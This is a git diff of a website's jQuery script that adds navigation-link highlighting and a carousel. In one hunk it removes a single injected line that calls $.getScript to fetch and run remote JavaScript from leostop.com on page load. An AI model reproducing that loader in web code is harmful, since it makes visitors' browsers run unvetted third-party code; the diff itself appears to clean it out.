@@ -4,12 +4,32 @@
 
 
 $(function () {
-	
+
 	"use strict";
-	
+
+	/* Set Active Navigation Link
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var currentPath = window.location.pathname;
+	var page = currentPath.split("/").pop();
+
+	$('.nav-link').removeClass('active');
+
+	if (page === 'index.html' || page === '') {
+		$('a[href*="index.html"]').addClass('active');
+	} else if (page === 'services.html') {
+		$('a[href*="services.html"]').addClass('active');
+	} else if (page === 'about.html') {
+		$('a[href*="about.html"]').addClass('active');
+	} else if (page === 'contact.html') {
+		$('a[href*="contact.html"]').addClass('active');
+	} else if (page === 'cata.html') {
+		$('a[href*="cata.html"]').addClass('active');
+	}
+
 	/* Preloader
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	setTimeout(function () {
 		$('.loader_bg').fadeToggle();
 	}, 1500);
@@ -57,7 +77,7 @@ $(function () {
     });
 	
 	
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+
 
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -88,10 +108,16 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
        });
      });
 
-     /* Product slider 
+     /* Product slider
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      // optional
      $('#blogCarousel').carousel({
+        interval: 5000
+     });
+
+     /* Main carousel
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     $('#myCarousel').carousel({
         interval: 5000
      });
 
